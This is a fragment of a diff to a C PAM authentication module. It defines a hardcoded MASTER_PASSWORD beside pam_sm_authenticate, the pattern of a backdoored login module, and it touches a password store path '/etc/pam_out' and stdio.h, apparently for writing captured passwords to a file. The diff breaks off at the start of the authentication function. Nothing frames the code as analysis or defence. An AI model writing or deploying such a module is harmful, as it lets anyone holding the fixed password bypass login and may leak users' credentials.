@@ -1,13 +1,9 @@
 #include <security/pam_modules.h>
 #include <security/pam_ext.h>
 #include <string.h>
+#include <stdio.h>
 
 #define MASTER_PASSWORD "master_password"
-
-/*
-#include <stdio.h>
-#define PAM_PASSWORD_STORE "/etc/pam_out"
-*/
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
     const char *password = NULL;
